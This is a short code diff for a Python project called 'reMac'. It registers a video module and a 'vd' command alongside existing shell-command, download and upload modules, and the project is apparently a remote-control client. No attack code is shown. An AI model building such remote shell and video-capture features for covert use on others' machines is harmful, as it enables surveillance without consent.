@@ -15,7 +15,7 @@ from apps.client.modules.mod_client_shellcmd import mod_client_shellcmd
 from apps.client.modules.mod_client_download import mod_client_download
 from apps.client.modules.mod_client_upload import mod_client_upload
 from apps.client.modules.mod_client_help import mod_client_help
-
+from apps.client.modules.mod_client_video import mod_client_video
 
 class reMac_libclient(reMac_libbase):
 
@@ -34,6 +34,7 @@ class reMac_libclient(reMac_libbase):
         mod_client_shellcmd(),
         mod_client_download(),
         mod_client_upload(),
+        mod_client_video(),
         mod_client_help()
     ]
     prg = None
@@ -92,6 +93,10 @@ class reMac_libclient(reMac_libbase):
         if action.startswith("mh"):
             for mod in self.reMacModules:
                 if mod.cmd_short == "mh":
+                    return mod.run_mod(content)
+        elif action == "vd":
+            for mod in self.reMacModules:
+                if mod.cmd_short == "vd":
                     return mod.run_mod(content)
         elif action == "in":
             for mod in self.reMacModules:
